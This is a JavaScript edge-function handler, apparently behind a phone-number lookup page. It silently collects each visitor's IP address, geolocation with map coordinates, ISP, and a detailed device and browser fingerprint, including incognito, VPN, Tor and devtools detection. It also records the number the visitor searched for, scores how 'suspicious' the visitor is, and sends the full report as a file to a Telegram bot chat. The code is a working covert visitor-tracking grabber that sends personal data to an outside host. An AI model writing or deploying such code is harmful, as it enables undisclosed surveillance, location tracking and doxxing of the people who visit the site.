export const config = {
  runtime: 'edge',
};

export default async function handler(request) {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json',
  };

  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers });
  }

  try {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // ===== IP =====
    const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim()
            || request.headers.get('x-real-ip')
            || request.headers.get('cf-connecting-ip')
            || 'Unknown';

    const userAgent = request.headers.get('user-agent') || 'Unknown';
    const referer = request.headers.get('referer') || 'Direct';
    const acceptLang = request.headers.get('accept-language') || 'Unknown';

    // ===== IP LOOKUP =====
    let ipInfo = {
      isp: 'Unknown', org: 'Unknown', as: 'Unknown', asname: 'Unknown',
      reverse: 'Unknown', proxy: false, hosting: false, mobile: false,
      country: 'Unknown', city: 'Unknown', region: 'Unknown', regionName: 'Unknown',
      zip: 'Unknown', lat: null, lon: null, timezone: 'Unknown',
    };

    try {
      if (ip && ip !== 'Unknown' && ip !== '127.0.0.1' && !ip.startsWith('192.168')) {
        const ipRes = await fetch(`https://ipwho.is/${ip}`);
        const ipData = await ipRes.json();

        if (ipData.success) {
          ipInfo = {
            isp: ipData.connection?.isp || 'Unknown',
            org: ipData.connection?.org || 'Unknown',
            as: `AS${ipData.connection?.asn || '?'}`,
            asname: ipData.connection?.domain || 'Unknown',
            reverse: ipData.connection?.domain || 'Unknown',
            proxy: ipData.security?.proxy || false,
            hosting: ipData.security?.hosting || false,
            mobile: ipData.connection?.type === 'mobile',
            country: ipData.country || 'Unknown',
            city: ipData.city || 'Unknown',
            region: ipData.region_code || 'Unknown',
            regionName: ipData.region || 'Unknown',
            zip: ipData.postal || 'Unknown',
            lat: ipData.latitude || null,
            lon: ipData.longitude || null,
            timezone: ipData.timezone?.id || 'Unknown',
          };
        }
      }
    } catch (e) {
      console.error('IP lookup failed:', e);
    }

    // ===== TOR DETECTION =====
    let torDetected = 'No';
    try {
      if (ipInfo.asname && ipInfo.asname.toLowerCase().includes('tor')) {
        torDetected = 'Yes (ASN)';
      }
      if (ipInfo.isp && ipInfo.isp.toLowerCase().includes('tor')) {
        torDetected = 'Yes (ISP)';
      }
    } catch {}

    // ===== CLIENT DATA =====
    const body = await request.json().catch(() => ({}));
    const searchType = body.searchType || 'Unknown';
    const searchedNumber = body.searchedNumber || 'Not provided';
    const screen = body.screen || 'Unknown';
    const screenAvail = body.screenAvail || 'Unknown';
    const colorDepth = body.colorDepth || 'Unknown';
    const pixelRatio = body.pixelRatio || 'Unknown';
    const orientation = body.orientation || 'Unknown';
    const language = body.language || 'Unknown';
    const languages = body.languages || 'Unknown';
    const platform = body.platform || 'Unknown';
    const browserTZ = body.timezone || 'Unknown';
    const battery = body.battery || 'Unknown';
    const batteryCharging = body.batteryCharging || 'Unknown';
    const gpu = body.gpu || 'Unknown';
    const gpuVendor = body.gpuVendor || 'Unknown';
    const cores = body.cores || 'Unknown';
    const memory = body.memory || 'Unknown';
    const touch = body.touch || 'Unknown';
    const cookies = body.cookies || 'Unknown';
    const doNotTrack = body.doNotTrack || 'Unknown';
    const online = body.online || 'Unknown';
    const connection = body.connection || 'Unknown';
    const pageLoadTime = body.pageLoadTime || 'Unknown';
    const vendor = body.vendor || 'Unknown';

    const incognito = body.incognito || 'Unknown';
    const adBlocker = body.adBlocker || 'Unknown';
    const vpnWebrtc = body.vpnWebrtc || 'Unknown';
    const isBot = body.isBot || 'Unknown';
    const botDetails = body.botDetails || 'Unknown';
    const botScore = body.botScore || 0;
    const headless = body.headless || 'Unknown';
    const automation = body.automation || 'Unknown';
    const devtools = body.devtools || 'Unknown';

    const device = detectDevice(userAgent);
    const browser = detectBrowser(userAgent);
    const os = detectOS(userAgent);

    const timestamp = new Date().toLocaleString('en-IN', {
      timeZone: 'Asia/Kolkata',
    });

    // ===== SUSPICION SCORE =====
    let suspicion = 0;
    const suspicionFlags = [];
    if (incognito === 'Yes') { suspicion += 20; suspicionFlags.push('Incognito'); }
    if (adBlocker === 'Yes') { suspicion += 10; suspicionFlags.push('Ad Blocker'); }
    if (torDetected !== 'No') { suspicion += 40; suspicionFlags.push('Tor'); }
    if (isBot.includes('Yes')) { suspicion += 50; suspicionFlags.push('Bot'); }
    if (headless !== 'No') { suspicion += 40; suspicionFlags.push('Headless'); }
    if (automation !== 'No') { suspicion += 40; suspicionFlags.push('Automation'); }
    if (devtools !== 'No') { suspicion += 20; suspicionFlags.push('DevTools'); }
    if (ipInfo.proxy) { suspicion += 30; suspicionFlags.push('Proxy'); }
    if (ipInfo.hosting) { suspicion += 20; suspicionFlags.push('Hosting'); }

    let suspicionLevel = 'LOW';
    if (suspicion >= 70) suspicionLevel = 'CRITICAL';
    else if (suspicion >= 40) suspicionLevel = 'HIGH';
    else if (suspicion >= 20) suspicionLevel = 'MEDIUM';

    // ===== TXT FILE CONTENT =====
    const fileContent = `=====================================================
              NEW SEARCH DETECTED
=====================================================

SEARCH QUERY
-----------------------------------------------------
  Type              : ${searchType}
  Number            : ${searchedNumber}

THREAT ASSESSMENT
-----------------------------------------------------
  Level             : ${suspicionLevel}
  Score             : ${suspicion}/100
  Flags             : ${suspicionFlags.length > 0 ? suspicionFlags.join(', ') : 'None'}

=====================================================
                  SECURITY CHECKS
=====================================================
  Incognito         : ${incognito}
  Ad Blocker        : ${adBlocker}
  Tor Network       : ${torDetected}
  Bot Detection     : ${isBot}
  Bot Score         : ${botScore}/12
  Bot Details       : ${botDetails}
  Headless Browser  : ${headless}
  Automation        : ${automation}
  DevTools Open     : ${devtools}
  WebRTC IP         : ${vpnWebrtc}

=====================================================
                  IP INFORMATION
=====================================================
  IP Address        : ${ip}
  ISP               : ${ipInfo.isp}
  Organization      : ${ipInfo.org}
  ASN               : ${ipInfo.as}
  AS Name           : ${ipInfo.asname}
  Reverse DNS       : ${ipInfo.reverse}

LOCATION
-----------------------------------------------------
  Country           : ${ipInfo.country}
  City              : ${ipInfo.city}
  Region            : ${ipInfo.regionName} (${ipInfo.region})
  Postal Code       : ${ipInfo.zip}
  Coordinates       : ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
  Timezone          : ${ipInfo.timezone}
  Google Maps       : ${ipInfo.lat && ipInfo.lon ? `https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}` : 'Not available'}

NETWORK FLAGS
-----------------------------------------------------
  Proxy/VPN         : ${ipInfo.proxy ? 'Yes' : 'No'}
  Hosting           : ${ipInfo.hosting ? 'Yes' : 'No'}
  Mobile Network    : ${ipInfo.mobile ? 'Yes' : 'No'}

=====================================================
                DEVICE INFORMATION
=====================================================
  Device            : ${device}
  Operating System  : ${os}
  Browser           : ${browser}
  Vendor            : ${vendor}
  Platform          : ${platform}

DISPLAY
-----------------------------------------------------
  Screen            : ${screen}
  Available Screen  : ${screenAvail}
  Orientation       : ${orientation}
  Color Depth       : ${colorDepth}
  Pixel Ratio       : ${pixelRatio}

HARDWARE
-----------------------------------------------------
  CPU Cores         : ${cores}
  RAM               : ${memory} GB
  GPU               : ${gpu}
  GPU Vendor        : ${gpuVendor}
  Battery           : ${battery}${batteryCharging === 'Yes' ? ' (Charging)' : ''}
  Touch Support     : ${touch}

BROWSER SETTINGS
-----------------------------------------------------
  Language          : ${language}
  All Languages     : ${languages}
  Timezone          : ${browserTZ}
  Cookies           : ${cookies}
  Do Not Track      : ${doNotTrack}
  Online            : ${online}
  Connection        : ${connection}
  Page Load Time    : ${pageLoadTime} ms

=====================================================
                REQUEST METADATA
=====================================================
  Referrer          : ${referer}
  Accept Language   : ${acceptLang}
  Timestamp         : ${timestamp}

=====================================================
                  USER AGENT
=====================================================
${userAgent}

=====================================================
                  END OF REPORT
=====================================================
`;

    // ===== TXT FILE BANAO =====
    const fileName = `search_${searchedNumber}_${Date.now()}.txt`;
    const blob = new Blob([fileContent], { type: 'text/plain' });

    // ===== FORM DATA BANAO =====
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, fileName);
    formData.append('caption', `New search detected: ${searchedNumber}\nThreat Level: ${suspicionLevel}`);
    formData.append('parse_mode', 'HTML');

    // ===== TELEGRAM PE FILE BHEJO =====
    const tgResponse = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
      {
        method: 'POST',
        body: formData,
      }
    );

    const tgResult = await tgResponse.json();

    return new Response(
      JSON.stringify({ success: true, telegram_sent: tgResult.ok }),
      { status: 200, headers }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      { status: 500, headers }
    );
  }
}

// ===== HELPERS =====

function detectDevice(ua) {
  if (/iPhone/i.test(ua)) {
    const m = ua.match(/iPhone OS (\d+_\d+)/);
    return m ? `iPhone (iOS ${m[1].replace('_', '.')})` : 'iPhone';
  }
  if (/iPad/i.test(ua)) return 'iPad';
  if (/Android/i.test(ua)) {
    const m = ua.match(/Android\s[\d.]+;\s([^)]+)/);
    return m ? `Android (${m[1]})` : 'Android';
  }
  if (/Windows/i.test(ua)) return 'Windows PC';
  if (/Macintosh/i.test(ua)) return 'Mac';
  if (/Linux/i.test(ua)) return 'Linux';
  return 'Unknown';
}

function detectBrowser(ua) {
  if (/Edg\//i.test(ua)) return 'Microsoft Edge';
  if (/OPR\//i.test(ua) || /Opera/i.test(ua)) return 'Opera';
  if (/Chrome\//i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
  if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
  if (/Firefox\//i.test(ua)) return 'Firefox';
  return 'Unknown';
}

function detectOS(ua) {
  if (/Windows NT 10/i.test(ua)) return 'Windows 10/11';
  if (/Windows NT 6.3/i.test(ua)) return 'Windows 8.1';
  if (/Windows NT 6.1/i.test(ua)) return 'Windows 7';
  if (/Mac OS X/i.test(ua)) return 'macOS';
  if (/Android/i.test(ua)) return 'Android';
  if (/iPhone|iPad/i.test(ua)) return 'iOS';
  if (/Linux/i.test(ua)) return 'Linux';
  return 'Unknown';
}
